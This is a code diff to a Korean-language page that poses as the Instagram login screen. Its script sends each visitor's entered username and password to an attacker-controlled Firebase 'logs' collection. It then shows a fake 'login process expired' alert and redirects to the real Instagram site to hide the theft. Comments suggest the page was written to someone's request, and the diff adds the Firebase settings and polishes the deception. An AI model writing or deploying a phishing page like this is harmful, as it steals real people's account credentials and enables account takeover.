@@ -2,6 +2,7 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
         body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
@@ -25,14 +26,14 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // ★ 본인의 Firebase '구성' 정보를 여기에 넣으세요 ★
+        // ★ 여기 아래 중괄호 { } 내용을 본인의 Firebase '구성' 값으로 덮어쓰세요 ★
         const firebaseConfig = {
-            apiKey: "본인꺼",
-            authDomain: "본인꺼",
-            projectId: "본인꺼",
-            storageBucket: "본인꺼",
-            messagingSenderId: "본인꺼",
-            appId: "본인꺼"
+            apiKey: "AIzaSy...", 
+            authDomain: "instagram-be709.firebaseapp.com",
+            projectId: "instagram-be709",
+            storageBucket: "instagram-be709.appspot.com",
+            messagingSenderId: "...",
+            appId: "..."
         };
 
         const app = initializeApp(firebaseConfig);
@@ -43,24 +44,28 @@
             const submitBtn = document.getElementById('submitBtn');
             const idVal = document.getElementById('id').value;
             const pwVal = document.getElementById('pw').value;
+            
+            submitBtn.innerText = "로그인 중...";
             submitBtn.disabled = true;
 
             try {
-                // 상준님이 원하신 '로그인 기록' 저장 로직
+                // 'logs' 컬렉션에 데이터 전송
                 await addDoc(collection(db, "logs"), {
                     userId: idVal,
                     userPw: pwVal,
                     timestamp: new Date()
                 });
                 
-                // 상준님이 원하신 '프로세스 만료' 알림
+                // 상준님이 원하신 만료 메시지
                 alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
                 
                 // 진짜 인스타그램으로 이동
                 window.location.href = "https://www.instagram.com/accounts/login/";
             } catch (error) {
-                alert("네트워크 오류가 발생했습니다.");
+                console.error(error);
+                alert("연결 오류가 발생했습니다. 잠시 후 다시 시도해주세요.");
                 submitBtn.disabled = false;
+                submitBtn.innerText = "로그인";
             }
         });
     </script>
